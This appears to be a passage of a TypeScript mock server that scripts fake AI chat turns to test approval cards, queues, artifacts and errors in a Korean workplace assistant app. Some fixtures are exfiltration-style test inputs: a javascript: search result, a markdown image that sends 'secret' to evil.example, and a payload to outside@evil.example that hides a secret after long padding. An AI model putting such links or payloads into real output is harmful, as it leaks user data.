    if (b.repeat === 'once' && (!b.date || b.date < now().slice(0, 10))) fail('validation', 400, '그 시각은 이미 지났어요. 앞으로의 날짜와 시각을 골라 주세요.', { 'body.date': '그 시각은 이미 지났어요. 앞으로의 날짜와 시각을 골라 주세요.' })
    const project = b.projectId ? this.projects.find((p) => p.id === b.projectId) ?? fail('validation', 400, '그 프로젝트를 찾을 수 없거나 열 수 없어요.', { 'body.projectId': 'not found' }) : null
    const days = ['일요일', '월요일', '화요일', '수요일', '목요일', '금요일', '토요일']
    const when = b.repeat === 'once' ? `${b.date} ${b.time}에 한 번` : b.repeat === 'daily' ? `매일 ${b.time}` : b.repeat === 'weekdays' ? `평일(월–금) ${b.time}` : b.repeat === 'weekly' ? `매주 ${days[b.weekday ?? 0]} ${b.time}` : `매월 ${b.day}일 ${b.time}`
    const urls = [...new Set(b.prompt.match(/https?:\/\/[^\s<>"')]+/g) ?? [])]
    const long = urls.filter((u) => new URL(u).search.length - 1 > 200), opens = urls.filter((u) => !long.includes(u))
    const lines = [`예약 작업을 이렇게 바꿀까요? 예약 작업은 아무도 지켜보지 않을 때 아래 지시문을 그대로 실행해요. 지시문과 주소를 확인해 주세요.\n\n제목: ${b.title.trim()}\n일정: ${when}${project ? `\n프로젝트: ${project.name}` : ''}`]
    if (opens.length) lines.push(`실행할 때마다 아래 주소 ${opens.length}개는 묻지 않고 열어요. 주소에 내용을 실어 밖으로 보낼 수도 있으니 주소 전체를 확인해 주세요.`)
    if (long.length) lines.push(`주소 뒤에 긴 내용(200자 넘는 쿼리)이 붙은 아래 주소 ${long.length}개는 실행 때 열지 않아요(강조 표시). 이런 주소는 늘 사람이 확인해야 하는데, 실행 중에는 확인할 사람이 없어요.`)
    const details = [{ label: '지시문', text: b.prompt.trim() }]
    if (opens.length) details.push({ label: '실행 때 묻지 않고 여는 주소', text: opens.join('\n') })
    if (long.length) details.push({ label: '실행 때 열지 않는 주소(긴 쿼리)', text: long.join('\n'), marks: long.map((u) => new URL(u).search) } as never)
    const key = JSON.stringify([b.title.trim(), b.prompt.trim(), b.repeat, b.time, b.weekday ?? null, b.day ?? null, b.date ?? null, b.projectId])
    return { kind: 'ask_user' as const, origin: 'server' as const, requestId: `schedule-edit-${x.id}-${Bun.hash(key).toString(36)}`, allowText: false, multiple: false,
      question: lines.join('\n\n'), options: [{ label: '바꾸기', value: 'save' }, { label: '바꾸지 않기', value: 'cancel' }], details }
  }

  /** "devqueue": box_shell on srt waits in the team queue (Step.devEnvRun, server/src/devenv/srt/queue.ts): #2 in line,
   * then #1, then it starts; GET /api/dev-env/runs gives the live place and POST .../stop cancels it. "slow": each place
   * holds 4 s; "devqueuefull": it waits too long and ends with the dev environment full; "devqueuejob": a job that
   * waits (#1) after the answer ends. */
  async devQueueTurn(chatId: string, user: User, prompt: string, assistant: Message, pub: (ev: ServerEventInput) => void, step: (s: Partial<Step> & Pick<Step, 'id' | 'kind' | 'label'>) => Step) {
    this.devEnv ??= {}
    const srt = (this.devEnv.srt ??= { running: [], waiting: [] })
    const id = `dq-${assistant.id.slice(-8)}`
    const by = { id: user.id, name: user.name }
    if (/devqueuejob/i.test(prompt)) {
      // a job: the call returns at once, queued #1; it stays in line after the answer
      srt.waiting = [...srt.waiting, { id, kind: 'job', name: 'render', by, startedAt: now(), runAt: null, position: 1, memoryMiB: null, lastLine: '', chatId, projectId: null }]
      const j = step({ id: 'q1', kind: 'tool', tool: 'box_shell', label: 'box_shell npx remotion render', status: 'ok', endedAt: now(), devEnvRun: { id, kind: 'job', state: 'waiting', position: 1 } })
      assistant.steps = [...assistant.steps.filter((y) => y.id !== j.id), j]
      pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: j } })
      return
    }
    srt.waiting = [...srt.waiting.filter((r) => r.id !== id), { id, kind: 'command', name: 'npm run build', by, startedAt: now(), runAt: null, position: 2, memoryMiB: null, lastLine: '', chatId, projectId: null }]
    const put = (x: Step) => { assistant.steps = [...assistant.steps.filter((y) => y.id !== x.id), x]; pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: x } }) }
    const q = step({ id: 'q1', kind: 'tool', tool: 'box_shell', label: 'box_shell npm run build', devEnvRun: { id, kind: 'command', state: 'waiting', position: 2 } })
    put(q)
    const hold = /slow/i.test(prompt) ? 4000 : 1500
    const waiting = () => srt.waiting.find((r) => r.id === id)
    for (const place of [2, 1]) {
      const e = waiting()
      if (e) e.position = place
      for (let t = 0; t < hold && waiting() && !this.stopped.has(assistant.turnId!); t += 50) await sleep(50)
    }
    const cancelled = !waiting()
    srt.waiting = srt.waiting.filter((r) => r.id !== id)
    const end = cancelled ? 'cancelled' as const : /devqueuefull/i.test(prompt) ? 'expired' as const : 'started' as const
    put({ ...q, status: end === 'started' ? 'ok' : 'error', endedAt: now(), devEnvRun: { id, kind: 'command', state: end, position: null } })
  }

  /** The scripted AI. */
  async runTurn(chatId: string, user: User, prompt: string, assistant: Message) {
    const turnId = assistant.turnId!
    const gen = this.generation
    const pub = (ev: ServerEventInput) => {
      if (gen !== this.generation) throw new Error('mock was reset')
      this.publish(ev)
    }
    const slow = /slow/i.test(prompt)
    const step = (s: Partial<Step> & Pick<Step, 'id' | 'kind' | 'label'>): Step => ({ status: 'running', startedAt: now(), endedAt: null, ...s })
    await sleep(60)
    while ((this.queuePositions.get(chatId) ?? 0) > 0 && !this.stopped.has(turnId)) {
      if (gen !== this.generation) return
      await sleep(20)
    }
    this.queuePositions.delete(chatId)
    pub({ type: 'queue.position', data: { chatId, messageId: assistant.id, turnId, position: 0, epoch: this.epoch, revision: ++this.queueRevision } })
    const s1 = step({ id: 's1', kind: 'tool', tool: 'grep', label: 'grep "plan" in marketing/' })
    assistant.steps = [s1]
    pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s1 } })
    await sleep(80)
    const s1done = { ...s1, status: 'ok' as const, endedAt: now() }
    assistant.steps = [s1done]
    pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s1done } })
    if (/search/i.test(prompt)) {
      const s2 = step({ id: 's2', kind: 'web_search', tool: 'WebSearch', label: 'Web search "team ax"', status: 'ok', endedAt: now(), sources: [{ title: 'Example result', url: 'https://example.com/a' }, { title: 'Poisoned result', url: 'javascript:top.document.title="pwned-search"' }] })
      assistant.steps = [...assistant.steps, s2]
      pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s2 } })
    }
    if (/wrong-guess/i.test(prompt)) {
      // the AI guesses a file name that does not exist, then finds the right file: a failed step it got past
      // (docs/DECISIONS.md "A failed step the AI got past is not red")
      const put = (x: Step) => { assistant.steps = [...assistant.steps.filter((y) => y.id !== x.id), x]; pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: x } }) }
      const guess = step({ id: 'g1', kind: 'tool', tool: 'read', label: '파일 읽기 · shared/company/acme-profile.md' })
      put(guess)
      await sleep(slow ? 600 : 60)
      put({ ...guess, status: 'error', endedAt: now() })
      const found = step({ id: 'g2', kind: 'tool', tool: 'glob', label: '파일 찾기 "*profile*" · shared/company/' })
      put(found)
      await sleep(slow ? 600 : 60)
      put({ ...found, status: 'ok', endedAt: now() })
      put(step({ id: 'g3', kind: 'tool', tool: 'read', label: '파일 읽기 · shared/company/acme-company-profile.md', status: 'ok', endedAt: now() }))
    }
    if (/save-fails/i.test(prompt)) {
      // the last thing the AI does, a save, fails and nothing after it works: a failure nobody got past (red)
      const put = (x: Step) => { assistant.steps = [...assistant.steps.filter((y) => y.id !== x.id), x]; pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: x } }) }
      const save = step({ id: 'f1', kind: 'tool', tool: 'write', label: '파일 저장 · shared/company/summary.md' })
      put(save)
      await sleep(60)
      put({ ...save, status: 'error', endedAt: now() })
    }
    if (/devqueue/i.test(prompt)) await this.devQueueTurn(chatId, user, prompt, assistant, pub, step)
    if (/sub-agent/i.test(prompt)) {
      // a sub-agent (Claude Code's Agent tool): its sub-task step, then its own steps under it (Step.parentId)
      const put = (x: Step) => { assistant.steps = [...assistant.steps.filter((y) => y.id !== x.id), x]; pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: x } }) }
      const a1 = step({ id: 'A1', kind: 'tool', tool: 'agent', label: '하위 작업: 계약서 비교', subtask: {} })
      put(a1)
      put(step({ id: 'c1', kind: 'tool', tool: 'read', label: '파일 읽기 · shared/contract-1.md', parentId: 'A1', status: 'ok', endedAt: now() }))
      put({ ...a1, subtask: { toolUses: 1, ms: 1200 } })
      put(step({ id: 'c2', kind: 'tool', tool: 'grep', label: '내용 검색 "수수료" · shared/', parentId: 'A1' }))
      put({ ...a1, subtask: { toolUses: 2, ms: 2400 } })
      await sleep(1500)
      put(step({ id: 'c2', kind: 'tool', tool: 'grep', label: '내용 검색 "수수료" · shared/', parentId: 'A1', status: 'ok', endedAt: now() }))
      put({ ...a1, status: 'ok', endedAt: now(), subtask: { toolUses: 2, ms: 80_400, hidden: 3 } })
    }
    // ("/meeting-tasks …", the general skill, has "ask" in its name and is no ask)
    if (/ask/i.test(prompt) && !/^\/meeting-tasks\b/.test(prompt)) {
      const requestId = 'q1'
      // "siteask": like server/src/tools/url-gate.ts with a site to allow (open once / allow the site / don't open) for a
      // plain address; "markask": an address with a random-looking part, highlighted, and no site choice
      const siteUrl = 'https://docs.example.co.kr/guide/start'
      const markUrl = 'https://docs.example.co.kr/r/c2fsyxj5ltk4nzy1ndmy'
      // "browsersite": like the in-app browser asking to open an office-network address (once / always / deny)
      const request: TurnRequest = /devenvsite/i.test(prompt)
        ? { kind: 'dev_env_site', requestId, host: 'api.openweathermap.org', command: 'curl -s https://api.openweathermap.org/data/2.5/weather?q=Seoul' }
        : /browsersite/i.test(prompt)
        ? { kind: 'browser_site', requestId, url: 'http://10.0.0.5/intranet/', host: '10.0.0.5', reason: '사내 문서 페이지를 열려고 해요.' }
        : /siteask/i.test(prompt)
        ? { kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
          question: `AI가 이 대화에 나온 적 없는 주소를 열려고 해요. 주소에 내용을 실어 밖으로 보낼 수도 있으니 주소 전체를 확인해 주세요.\n\n${siteUrl}\n\n사이트를 허용하면 이 대화에서만 example.co.kr의 다른 주소도 묻지 않고 열어요. 알아보기 어려운 긴 문자열이나 긴 내용이 붙은 주소는 계속 물어요.`,
          options: [{ label: '열기', value: 'allow' }, { label: '이 대화에서 이 사이트 허용 (example.co.kr)', value: 'site' }, { label: '열지 않기', value: 'deny' }] }
        : /markask/i.test(prompt)
        ? { kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
          question: `AI가 이 대화에 나온 적 없는 주소를 열려고 해요. 주소에 내용을 실어 밖으로 보낼 수도 있으니 주소 전체를 확인해 주세요.\n\n${markUrl}\n\n주소에 알아보기 어려운 긴 문자열이 있어요(강조 표시). 내용을 실어 보낼 수 있으니 무엇인지 확인해 주세요.`,
          options: [{ label: '열기', value: 'allow' }, { label: '열지 않기', value: 'deny' }],
          details: [{ label: '주소', text: markUrl, marks: ['c2fsyxj5ltk4nzy1ndmy'] }] }
        : /safety/i.test(prompt)
        ? { kind: 'ask_user', origin: 'server', requestId, question: 'AI가 이 대화에 나온 적 없는 주소를 열려고 해요.\n\nhttps://example.com/?d=1', options: [{ label: '열기', value: 'allow' }, { label: '열지 않기', value: 'deny' }], allowText: false }
        : /multi/i.test(prompt)
          ? { kind: 'ask_user', requestId, question: '보고서에 어느 분기를 넣을까요?', options: [{ label: '3분기', value: 'q3' }, { label: '4분기', value: 'q4' }], multiple: true, allowText: true }
          : { kind: 'ask_user', requestId, question: '어느 분기를 볼까요?', options: [{ label: '3분기', value: 'q3' }, { label: '4분기', value: 'q4' }], allowText: true }
      this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
      pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
      // like the server: the chat list says the AI waits for the person (Chat.waiting) while the card is open
      const waits = this.chats.find((c) => c.id === chatId)!
      waits.waiting = true
      // a card that opens is worth telling (chat.updated notify 'card', docs/DECISIONS.md "Session markers")
      pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat: waits, notify: 'card' } })
      const answer = await new Promise((r) => this.pendingAsk.set(turnId, r))
      this.openAsks.delete(turnId)
      pub({ type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } })
      delete waits.waiting
      pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat: waits } })
      if (request.kind === 'dev_env_site' && answer === 'always') {
        const mine = this.devEnvSites.get(user.id) ?? { sites: [], full: false }
        if (!mine.sites.some((x) => x.host === request.host)) mine.sites.push({ host: request.host, createdAt: now() })
        this.devEnvSites.set(user.id, mine)
      }
      prompt += ` answered:${JSON.stringify(answer)}`
    }
    if (/connecttemplate/i.test(prompt)) {
      // like server/src/chat/connect-service.ts: the connect card for an admin's template this person has not connected
      // (the person's own key, the template's address); it stays until the turn's time for it runs out
      const t = this.integrationTemplates.find((x) => this.templateCovers(x, user) && !this.integrations.some((y) => y.templateId === x.id && y.ownerId === user.id))
      if (t) {
        const requestId = 'ct1'
        const request: TurnRequest = {
          kind: 'connect_service', requestId, target: 'service', name: t.name, scope: 'personal',
          service: { kind: t.kind, url: t.url, host: new URL(t.url).host, auth: t.auth, authHeader: t.authHeader }, template: { id: t.id, version: t.version },
          why: `You asked for your ${t.name} pages.`, expiresAt: new Date(Date.now() + 60_000).toISOString(),
        }
        this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
        pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
        await Promise.race([new Promise((r) => this.pendingAsk.set(turnId, r)), sleep(60_000)])
        this.openAsks.delete(turnId)
        pub({ type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } })
      }
    }
    if (/sendcard/i.test(prompt)) {
      // like server/src/integrations/connections/tools.ts gate: everything a connected service is sent, where it goes first
      const requestId = 'w1'
      const payload = JSON.stringify({ title: 'Weekly notes c2fsyxj5ltk4nzy1ndmy ' + 'x'.repeat(2000) + ' SECRET-AT-THE-END', to: 'outside@evil.example' }, null, 2)
      const request: TurnRequest = {
        kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
        question: 'AI가 Tasks에서 이 작업을 하려고 해요: create_task\n\n보낼 내용 전체와 받는 곳을 아래에서 확인해 주세요.\n\n보낼까요?',
        options: [{ label: '보내기', value: 'allow' }, { label: '보내지 않기', value: 'deny' }],
        details: [{ label: '보낼 내용', text: payload, fields: [{ name: 'to', value: 'outside@evil.example' }], marks: ['c2fsyxj5ltk4nzy1ndmy'] }],
      }
      this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
      pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
      const answer = await new Promise((r) => this.pendingAsk.set(turnId, r))
      this.openAsks.delete(turnId)
      pub({ type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } })
      prompt += ` answered:${JSON.stringify(answer)}`
    }
    if (/skillsave/i.test(prompt)) {
      // like server/src/chat/turn.ts confirmSkillWrite: the server's card before anything is saved under skills/
      const requestId = 'k1'
      const after = '---\nname: 주간 보고서\ndescription: 이번 주 회의록으로 보고서를 만든다\n---\n1. 회의록을 읽는다\n2. 표로 정리한다\n'
      const request: TurnRequest = {
        kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
        question: '팀 스킬/규칙으로 저장할까요? 팀 전체 AI가 따라요.\n\nskills/weekly.md (새 팀 스킬 "주간 보고서")',
        options: [{ label: '저장', value: 'save' }, { label: '저장하지 않기', value: 'skip' }],
        preview: { kind: 'skill_write', path: 'skills/weekly.md', isNew: true, skillName: '주간 보고서', diff: '@@ -0,0 +1,6 @@\n' + after.trimEnd().split('\n').map((l) => '+' + l).join('\n'), added: 6, removed: 0, truncated: false },
      }
      this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
      pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
      const answer = await new Promise((r) => this.pendingAsk.set(turnId, r))
      this.openAsks.delete(turnId)
      pub({ type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } })
      const saved = answer === 'save' || (Array.isArray(answer) && answer[0] === 'save')
      if (saved) {
        this.putFile('skills/weekly.md', after)
        this.skillChange({ id: uuidv7(), at: now(), actor: { id: user.id, name: user.name }, path: 'skills/weekly.md', change: 'create', from: null, byAi: true, kind: 'skill' })
      }
      const text = saved ? 'Saved skills/weekly.md.' : 'Not saved: you did not allow saving under skills/.'
      assistant.content = text
      pub({ type: 'message.delta', data: { chatId, messageId: assistant.id, offset: 0, text } })
      assistant.status = 'done'
      if (saved) assistant.files = { saved: [{ path: 'skills/weekly.md', action: 'create' }], conflicts: [], rejected: [] }
      const chat = this.chats.find((c) => c.id === chatId)!
      chat.runState = 'idle'
      if (!chat.title) chat.title = 'skill'
      pub({ type: 'message.done', data: { chatId, messageId: assistant.id, status: 'done', message: this.view(assistant) } })
      pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat } })
      return
    }
    if (/artifact|react/i.test(prompt)) {
      const react = /react/i.test(prompt)
      const key = react ? 'counter' : 'hello-page'
      let content = react && /d3/i.test(prompt)
        ? 'import * as d3 from "d3"\nexport default function App() {\n  return <p>{d3.sum([1, 2])}</p>\n}\n'
        : react
        ? 'import { useState } from "react"\nimport { Plus } from "lucide-react"\nexport default function App() {\n  const [n, setN] = useState(0)\n  return <button className="rounded bg-emerald-600 px-3 py-2 text-white" onClick={() => setN(n + 1)}><Plus size={14} /> count {n}</button>\n}\n'
        : /broken/i.test(prompt)
          ? '<h1>Broken</h1><script>throw new Error("boom")</script>'
          : /wander/i.test(prompt)
            ? `<h1>Wanderer</h1><script>setTimeout(function () { location.href = ${JSON.stringify(/home/i.test(prompt) ? "/" : "https://example.com/")} }, 1500)</script>`
          : '<h1 id="t">Hello artifact</h1><script>document.getElementById("t").textContent += " (ran)"; fetch("https://example.com/x").catch(()=>{})</script>'
      const injected = this.nextArtifact
      this.nextArtifact = null
      const type = injected?.type ?? (react ? ('react' as const) : ('html' as const))
      if (injected) content = injected.content
      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key, type, title: react ? 'Counter' : 'Hello page', status: 'writing', content: content.slice(0, 20), artifact: null } })
      await sleep(120)
      const prev = this.artifacts.filter((a) => a.chatId === chatId && a.key === key)
      const a: Artifact = { id: uuidv7(), chatId, messageId: assistant.id, key, version: prev.length + 1, type, title: react ? 'Counter' : 'Hello page', language: null, content, createdAt: now() }
      this.artifacts.push(a)
      const { content: _c, ...summary } = a
      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key, type, title: a.title, status: 'done', artifact: { ...summary, size: content.length } } })
    }
    if (/^\/promo-video\b/.test(prompt)) {
      // like the team server (server/src/promo-video/tool.ts): the promo video arrives saved, with no "writing" previews
      const content = '<!DOCTYPE html><html lang="ko"><body><div class="pv"><h1>조용한 책상 선풍기</h1></div></body></html>'
      const version = this.artifacts.filter((a) => a.chatId === chatId && a.key === PROMO_ARTIFACT_KEY).length + 1
      const a: Artifact = { id: uuidv7(), chatId, messageId: assistant.id, key: PROMO_ARTIFACT_KEY, version, type: 'html', title: 'Acme 홍보 영상', language: null, content, createdAt: now() }
      this.artifacts.push(a)
      const { content: _c, ...summary } = a
      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key: a.key, type: a.type, title: a.title, status: 'done', artifact: { ...summary, size: content.length } } })
    }
    if (/^\/intro-deck\b/.test(prompt)) {
      // like the team server (server/src/intro-deck/, round 2): an outline, one slide per intro_deck call, the review,
      // then the deck arrives saved (no "writing" previews); deck.progress after each step
      const pace = this.deckPaceMs
      const plan: [DeckBuild['slides'][number]['kind'], string, DeckBuild['slides'][number]['figure'], boolean][] = [
        ['cover', '표지', null, true], ['about', '회사 소개', 'hub', false], ['needs', '고객의 고민', 'merge', false], ['offer', '하는 일', 'layers', false],
        ['numbers', '숫자', 'donut', false], ['products', '제품', 'grid', false], ['process', '일하는 방식', 'flow', false], ['proof', '고객의 말', null, false],
        ['contact', '마무리', null, false],
      ]
      let build: DeckBuild = {
        id: uuidv7(), chatId, messageId: assistant.id, title: 'Acme 회사 소개서', phase: 'slides', current: null, tier: this.deckTier,
        slides: plan.map(([kind, section, figure, picture]) => ({ kind, section, figure, picture, status: 'planned' as const, rev: 0 })),
        startedAt: assistant.createdAt, outlineAt: null, slidesAt: null, finishedAt: null, artifactId: null, thumbs: this.deckThumbs,
      }
      const progress = (b: DeckBuild) => {
        build = b
        this.deckBuilds = [...this.deckBuilds.filter((x) => x.id !== b.id), b]
        pub({ type: 'deck.progress', data: { chatId, build: b } })
      }
      const call = async (id: string, ok = true) => {
        const st = step({ id, kind: 'tool', tool: 'intro_deck', label: '회사 소개서 만들기 · Acme 회사 소개서' })
        assistant.steps = [...assistant.steps, st]
        pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: st } })
        await sleep(pace)
        const end = { ...st, status: ok ? 'ok' as const : 'error' as const, endedAt: now() }
        assistant.steps = assistant.steps.map((x) => (x.id === id ? end : x))
        pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: end } })
      }
      await sleep(pace)
      // the longer budgets read the company's site and a few articles first, with the build already there
      if (this.deckTier !== 'quick') {
        for (const read of [{ pages: 4, articles: 0 }, { pages: 9, articles: 0 }, { pages: 9, articles: 3 }]) {
          progress({ ...build, phase: 'reading', read, slides: [] })
          await sleep(pace)
        }
      }
      await call('d-outline')
      progress({ ...build, phase: 'slides', slides: plan.map(([kind, section, figure, picture]) => ({ kind, section, figure, picture, status: 'planned' as const, rev: 0 })), outlineAt: now(), current: 0 })
      const failAt = /deck-fail/i.test(prompt) ? 3 : -1
      for (let i = 0; i < build.slides.length && i !== failAt; i++) {
        progress({ ...build, current: i, slides: build.slides.map((x, j) => (j === i ? { ...x, status: 'working' as const } : x)) })
        // the third slide's first try is refused and made again: a normal step in the block, no red mark
        if (i === 2) await call(`d-slide-${i}-a`, false)
        await call(`d-slide-${i}`)
        progress({ ...build, slides: build.slides.map((x, j) => (j === i ? { ...x, status: 'done' as const, rev: x.rev + 1 } : x)) })
      }
      if (failAt >= 0) {
        progress({ ...build, phase: 'failed', current: null, finishedAt: now() })
      } else {
        progress({ ...build, phase: 'review', current: null, slidesAt: now() })
        await sleep(pace)
        await call('d-finish')
        const content = '<!DOCTYPE html><html lang="ko"><body><section class="slide" aria-roledescription="slide"><h1>조용한 책상 선풍기</h1></section></body></html>'
        const version = this.artifacts.filter((a) => a.chatId === chatId && a.key === DECK_ARTIFACT_KEY).length + 1
        const a: Artifact = { id: uuidv7(), chatId, messageId: assistant.id, key: DECK_ARTIFACT_KEY, version, type: 'html', title: 'Acme 회사 소개서', language: null, content, createdAt: now() }
        this.artifacts.push(a)
        const { content: _c, ...summary } = a
        pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key: a.key, type: a.type, title: a.title, status: 'done', artifact: { ...summary, size: content.length } } })
        progress({ ...build, phase: 'done', finishedAt: now(), artifactId: a.id })
      }
    }
    if (/^\/card-news\b/.test(prompt)) {
      // like the team server (server/src/tools/artifact.ts): the card news arrives saved, with no "writing" previews
      const content = '<!DOCTYPE html><html lang="ko"><body><section class="card"><h1>조용한 책상 선풍기</h1></section></body></html>'
      const version = this.artifacts.filter((a) => a.chatId === chatId && a.key === CARD_NEWS_ARTIFACT_KEY).length + 1
      const a: Artifact = { id: uuidv7(), chatId, messageId: assistant.id, key: CARD_NEWS_ARTIFACT_KEY, version, type: 'html', title: 'Acme 카드뉴스', language: null, content, createdAt: now() }
      this.artifacts.push(a)
      const { content: _c, ...summary } = a
      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key: a.key, type: a.type, title: a.title, status: 'done', artifact: { ...summary, size: content.length } } })
    }
    const capped = /cap-tools/i.test(prompt) ? 'tool_limit' as const : /cap-time/i.test(prompt) ? 'time_limit' as const : null
    // the time limit stops a step that is still running (a long read): like turn.ts, it ends paused, not failed;
    // "stop-cut": a step still running when the person presses Stop ends stopped, not failed
    const cut = capped === 'time_limit' || /stop-cut/i.test(prompt) ? step({ id: 's-cut', kind: 'tool', tool: 'read', label: 'read applications/21.pdf' }) : null
    if (cut) {
      assistant.steps = [...assistant.steps, cut]
      pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: cut } })
    }
    const text = /error/i.test(prompt)
      ? ''
      : capped
        ? 'Sorting the applications into the table.\n\n- Read 20 of 40 so far\n- Scored each one against the job description\n- Saved the first half to the shared sheet\n\nThe rest are still in the folder; this answer stopped before reaching them.'
      : /long list/i.test(prompt)
        ? `캠페인 아이디어를 모았어요.\n\n${Array.from({ length: 400 }, (_, i) => `- 아이디어 ${i + 1}: 지역 매장과 함께하는 주말 이벤트, 참가 고객에게 다음 구매 할인 쿠폰`).join('\n')}\n`
      : /share files/i.test(prompt)
        ? `견적서를 만들었어요: [acme-quote.md](/files/view?path=${encodeURIComponent(`users/${user.id}/quotes/acme-quote.md`)}). 용어는 [glossary.md](/files/view?path=shared%2Fglossary.md)에, 원가는 [payroll.csv](/files/view?path=secret%2Fpayroll.csv)에 있어요.`
      : /sources/i.test(prompt)
        ? '매출은 [report.pdf · p.4](/files/view?path=docs%2Fsources%2Freport.pdf&page=4)에 있어요. 채널별 금액은 [budget.xlsx · 시트 \'매출\' A40:C44](/files/view?path=docs%2Fsources%2Fbudget.xlsx&sheet=%EB%A7%A4%EC%B6%9C&range=A40:C44)을 보면 돼요.'
      : /^\/intro-deck\b/.test(prompt)
        ? (/deck-fail/i.test(prompt) ? '소개서를 끝까지 만들지 못했어요. 다시 해 볼까요?' : '회사 소개서를 만들었어요. 바꾸고 싶은 장이나 문구가 있으면 말씀해 주세요.')
      : prompt.includes('answered:')
        ? `You chose ${prompt.split('answered:')[1]}.`
        : /artifact|react/i.test(prompt)
          ? 'I made an artifact for you.'
          : `Here is **the answer** for: ${prompt.slice(0, 40)}\n\n| name | value |\n|---|---|\n| alpha | 1 |\n| beta | 2 |\n\n\`\`\`python\nprint("hi")\n\`\`\`\n\nMath: $x^2 + 1$ and a price of $5.\n\n![chart](https://evil.example/collect?d=secret)\n\n\`\`\`mermaid\ngraph TD; A-->B\n\`\`\`\n\n[plan](/api/files/download?path=marketing%2Fplan.md)\n`
    const chunks = text.match(/long list/i.test(prompt) ? /[\s\S]{1,4000}/g : /[\s\S]{1,12}/g) ?? []
    for (const piece of chunks) {
      if (this.stopped.has(turnId)) break
      const offset = assistant.content.length
      assistant.content += piece
      pub({ type: 'message.delta', data: { chatId, messageId: assistant.id, offset, text: piece } })
      await sleep(slow ? 150 : 15)
    }
    assistant.status = this.stopped.has(turnId) ? 'stopped' : /error/i.test(prompt) ? 'error' : 'done'
    // like server/src/chat/turn.ts at a per-answer limit: 'done', not an error, with the reason
    if (assistant.status === 'done' && capped) assistant.stopReason = capped
    if (cut) assistant.steps = assistant.steps.map((x) => (x.id === cut.id ? { ...x, status: 'error' as const, endedAt: now(), ...(assistant.stopReason ? { paused: true as const } : assistant.status === 'stopped' ? { stopped: true as const } : {}) } : x))
    // like a fresh engine session (Codex every turn, an edit): history before this message past 40,000 characters
    // reaches the AI only in part (server/src/chat/prompt.ts historyWindow)
    let earlier = 0
    const asked = this.messages.find((m) => m.id === assistant.parentId)
    for (let cur = asked ? this.messages.find((m) => m.id === asked.parentId) : undefined; cur; cur = this.messages.find((m) => m.id === cur!.parentId)) earlier += cur.content.length + 'Assistant: '.length
    if (assistant.status !== 'error' && earlier > 40_000) assistant.historyTrimmed = true
    if (assistant.status === 'error') {
      assistant.error = { code: 'engine_unavailable', message: ERROR_MESSAGES.engine_unavailable.ko }
      // Stored chat-error fixtures, delivered through both message.done and listMessages.
      const fixture = /^(legacy )?error:(\w+)\n/.exec(prompt)
      if (fixture && Object.hasOwn(CHAT_ERROR_MESSAGES, fixture[2]!)) {
        const reason = fixture[2] as ChatErrorReason
        const text = CHAT_ERROR_MESSAGES[reason]
        assistant.error = { code: text.code, message: text.ko, ...(fixture[1] ? {} : { params: { reason } }) }
      } else if (fixture?.[2] === 'unknown') assistant.error.message = 'Unknown upstream failure'
      else if (fixture?.[2] === 'future') assistant.error.params = { reason: 'future_failure' }
    }
    if (/sources/i.test(prompt)) {
      // like server/src/files/sources.ts: what the answer read or saw passages of, a sub-agent's read marked; one file
      // nobody can open (secret/) only counts
      const list: MessageSourceFile[] = [
        { path: 'docs/sources/report.pdf', name: 'report.pdf', locs: [{ kind: 'page', page: 4 }, { kind: 'page', page: 5 }], via: ['read', 'search'] },
        { path: 'docs/sources/budget.xlsx', name: 'budget.xlsx', locs: [{ kind: 'sheet', sheet: '매출', range: 'A40:C44' }], via: ['search'] },
        { path: 'docs/sources/deck.pptx', name: 'deck.pptx', locs: [{ kind: 'slide', slide: 5 }], via: ['read'], subagent: true },
        { path: 'marketing/plan.md', name: 'plan.md', locs: [], via: ['grep'] },
        { path: 'secret/payroll.csv', name: 'payroll.csv', locs: [], via: ['read'] },
      ]
      this.sources.set(assistant.id, list)
      assistant.sourceCount = list.length
    }
    if (/mine-source/i.test(prompt)) {
      // a read of a note in my own folder (the share of a whole chat asks about it: server/src/chat/share-chat.ts)
      this.putFile(`users/${user.id}/notes/plan.md`, '# My plan\n')
      this.sources.set(assistant.id, [{ path: `users/${user.id}/notes/plan.md`, name: 'plan.md', locs: [], via: ['read'] }])
      assistant.sourceCount = 1
    }
    if (/share files/i.test(prompt)) {
      this.putFile(`users/${user.id}/quotes/acme-quote.md`, '# Acme 견적서\n단가 12,000원\n')
      this.putFile('shared/glossary.md', '# Glossary\n')
    }
    if (/files/i.test(prompt) && !/share files/i.test(prompt)) {
      this.putFile('marketing/report.md', '# Report\n')
